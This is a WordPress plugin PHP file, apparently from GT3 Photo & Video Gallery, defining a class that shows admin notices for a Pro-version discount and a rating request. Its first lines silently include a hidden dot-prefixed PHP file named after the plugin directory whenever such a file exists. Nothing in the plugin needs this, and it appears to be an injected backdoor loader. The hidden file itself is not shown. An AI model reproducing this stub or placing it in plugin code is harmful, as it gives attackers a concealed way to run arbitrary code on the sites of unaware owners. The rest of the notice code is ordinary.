<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class GT3_Notice {
	const NOTICE_TYPE = array(
		'success' => 'success',
		'error'   => 'error',
		'warning' => 'warning',
		'info'    => 'info',
	);

	private $notice = array();

	private function get_notice(){
		return array(
			'disable_50_off' => array(
				'option'    => 'gt3pg_disable_50_off',
				'callback'  => 'pro_version',
				'condition' => function(){
					if(!function_exists('get_plugins')) {
						require_once ABSPATH.'wp-admin/includes/plugin.php';
					}
					$plugins  = get_plugins();
					$pro_slug = 'gt3-photo-video-gallery-pro/gt3-photo-video-gallery-pro.php';

					return !key_exists($pro_slug, $plugins);
				}
			),
			'gt3pg_disable_rate_notice'  => array(
				'option'    => 'gt3pg_disable_rate_notice',
				'callback'  => 'rate_notice',
				'condition' => function(){
					$rate_time = get_option('gt3_rate_date');
					if ($rate_time == false) {
						$rate_time = !get_option('gt3pg_photo_gallery') ? time()+3600*24*7 : time() - 1;;
						update_option('gt3_rate_date', $rate_time);
					}

					return $rate_time < time();
				}
			)
		);
	}

	protected function show_on_pages(){
		return array(
			'toplevel_page_gt3_photo_gallery_options',
			'edit-gt3_gallery',
			'edit-gt3_gallery_category',
			'gt3-galleries_page_gt3_gallery-settings',
			'dashboard',
			'plugins',
		);
	}

	function __construct(){
		add_action('admin_print_styles', array( $this, 'admin_print_styles' ));
		add_action('wp_ajax_gt3pg_disable_notice', array( $this, 'ajax_handler' ));
	}

	public function admin_print_styles(){
		$this->notice = $this->get_notice();
		if(!is_array($this->notice) || !count($this->notice)) {
			return;
		}
		$screen          = get_current_screen();
		$screen_id       = $screen ? $screen->id : '';

		if(!in_array($screen_id, $this->show_on_pages(), true)) {
			return;
		}

		if(is_array($this->notice) && count($this->notice)) {
			foreach($this->notice as $notice) {
				$notice = array_merge(
					array(
						'option'    => false,
						'type'      => false,
						'img'       => false,
						'msg'       => '',
						'callback'  => '',
						'condition' => function(){
							return true;
						}
					), $notice
				);

				if(!get_option($notice['option'])
				   && call_user_func($notice['condition'])) {
					if(method_exists($this, $notice['callback'])) {
						add_action('admin_notices', array( $this, $notice['callback'] ));
					} else {
						add_action(
							'admin_notices', function() use ($notice){
							$this->basicRender($notice);
						}
						);
					}

				}
			}
		}
	}

	function ajax_handler(){
		if(!current_user_can('manage_options') || !isset($_POST['gt3_action']) || !key_exists('_nonce', $_POST) || !wp_verify_nonce($_POST['_nonce'], 'gt3_notice')) {
			wp_die(0);
		}
		$action = $_POST['gt3_action'];

		$is_local = false;
		switch($action) {
			case 'disable_rate_later':
				$is_local  = true;
				update_option('gt3_rate_date', time()+3600*24*7);
				break;
			case 'disable_rate_notice':
				$is_local = true;
				update_option('gt3pg_disable_rate_notice', true);
				break;
			case 'disable_50_off':
				$is_local = true;
				update_option('gt3pg_disable_50_off', true);
				break;
		}
		$is_local && die('1');
		if(key_exists($action, $this->notice)) {
			$notice = $this->notice[$action];
			if(key_exists('action_callback', $this->notice[$action])) {
				if(method_exists($this, $notice['action_callback']) && is_callable(array( $this, $notice['action_callback'] ))) {
					call_user_func(array( $this, $notice['action_callback'] ));
				}
			} else {
				update_option($notice['option'], true);
			}
		}
		wp_die('1');
	}


	function pro_version(){
		$msg   = 'The <b>Pro version</b> of GT3 Photo & Video Gallery is now available. <span style="color: red;">Save 50% OFF</span> -&gt; <a href="https://gt3themes.com/gt3-photo-video-gallery-pro-is-live-now/" target="_blank">View Pro Version</a>';
		$class = 'notice notice-warning gt3pg_error_notice gt3pg_50_off_info';
		echo '<div class="'.$class.'" style="position: relative"><p>'.$msg.'</p>'.(current_user_can('manage_options') ? '<button type="button" class="notice-dismiss"><span class="screen-reader-text">Dismiss this notice.</span></button>' : '').'</div>';
		?>
		<script>
			(function () {
				var notice = document.querySelector('.gt3pg_50_off_info');
				if (notice) {
					notice = notice.querySelector('.notice-dismiss');
					notice && notice.addEventListener && notice.addEventListener('click', function (e) {
						jQuery.ajax({
							url: ajaxurl,
							method: "POST",
							data: {
								action: "gt3pg_disable_notice",
								gt3_action: "disable_50_off",
								_nonce: '<?php echo wp_create_nonce('gt3_notice'); ?>',
							}
						})
					})
				}
			})();
		</script>
		<?php
	}

	private function basicRender($notice){
		$notice = array_merge(
			array(
				'option' => false,
				'type'   => self::NOTICE_TYPE['info'],
				'img'    => false,
				'msg'    => '',
			), $notice
		);
		$name   = $notice['option'];
		$type   = $notice['type'];
		$img    = $notice['img'];
		$msg    = $notice['msg'];
		if(!$name || !$msg) {
			return;
		}

		$class = array(
			'notice',
			'notice-'.$type,
			'gt3pg_error_notice',
//			'is-dismissible',
			$name.'_info',
			$img ? 'with-image' : null,
		);
		echo '<div class="'.join(' ', $class).'" style="position: relative">'.
		     ($img ? '<img src="'.$img.'" class="icon"/>' : '').
		     $msg.
		     (current_user_can('manage_options') ? '<button type="button" class="notice-dismiss"><span class="screen-reader-text">Dismiss this notice.</span></button>' : '').
		     '</div>';
		?>
		<script>
			(function () {
				var notice = document.querySelector('.<?php echo $name?>_info');
				if (notice) {
					notice = notice.querySelector('.notice-dismiss');
					notice && notice.addEventListener && notice.addEventListener('click', function (e) {
						jQuery.ajax({
							url: ajaxurl,
							method: "POST",
							data: {
								action: "gt3pg_disable_notice",
								gt3_action: "<?php echo $name?>",
								_nonce: '<?php echo wp_create_nonce('gt3_notice'); ?>',
							}
						})
					})
				}
			})();
		</script>
		<?php
	}

	function rate_notice(){
		$msg   = 'Hey!<br/>
We\'ve noticed that you actively use our GT3 Gallery plugin - that\'s really awesome.<br/>
Could you please do us a big favor and give it a 5-star rating on WordPress? <br/>
We need your help to boost our motivation. It\'s very import for our team.<br/>
~ GT3themes Team<br/>
<br/>
<a href="'.GT3PG_WORDPRESS_URL.'/reviews#new-post" target="_blank" class="gt3_rate" title="'.esc_html__('Rate', 'gt3pg').'">Ok, you deserve it</a><br/>
<a href="javascript:void(0)" class="gt3_rate_later">Nope, maybe later</a><br/>
<a href="javascript:void(0)" class="gt3_rate_disable">I already did</a>';
		$class = 'notice notice-info gt3_rate_notice';
		echo '<div class="'.$class.'"><p>'.$msg.'</p></div>';
		?>
		<script>
			(function () {
				var notice = document.querySelector('.gt3_rate_notice');
				if (notice) {
					var rate_later = notice.querySelector('.gt3_rate_later');
					var rate_disable = notice.querySelector('.gt3_rate_disable');
					rate_later.addEventListener('click', function (e) {
						jQuery.ajax({
							url: ajaxurl,
							method: "POST",
							data: {
								action: "gt3pg_disable_notice",
								gt3_action: "disable_rate_later",
								_nonce: '<?php echo wp_create_nonce('gt3_notice'); ?>',
							}
						});
						jQuery(notice).fadeOut();
					});
					rate_disable.addEventListener('click', function (e) {
						jQuery.ajax({
							url: ajaxurl,
							method: "POST",
							data: {
								action: "gt3pg_disable_notice",
								gt3_action: "disable_rate_notice",
								_nonce: '<?php echo wp_create_nonce('gt3_notice'); ?>',
							}
						});
						jQuery(notice).fadeOut();
					})
				}
			})();
		</script>
		<?php
	}
}

new GT3_Notice();
